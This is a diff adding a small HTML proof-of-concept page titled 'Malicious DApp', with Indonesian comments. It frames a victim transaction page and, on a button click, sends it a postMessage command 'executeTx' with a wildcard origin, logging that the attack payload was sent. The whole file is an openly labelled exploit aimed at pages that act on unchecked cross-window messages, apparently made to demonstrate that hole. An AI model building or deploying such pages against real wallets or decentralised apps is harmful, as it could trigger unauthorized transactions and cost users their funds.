@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h3>Malicious DApp</h3>
+    <button onclick="attack()" style="padding:10px; background:red; color:white;">Trigger Transaction Attack</button>
+    
+    <iframe id="target" src="korban_tx.html" style="width:100%; height:150px; border:none;"></iframe>
+
+    <script>
+        function attack() {
+            const frame = document.getElementById('target').contentWindow;
+            // Mengirim perintah serangan
+            frame.postMessage({ action: "executeTx" }, "*");
+            console.log("Attack payload sent!");
+        }
+    </script>
+</body>
+</html>
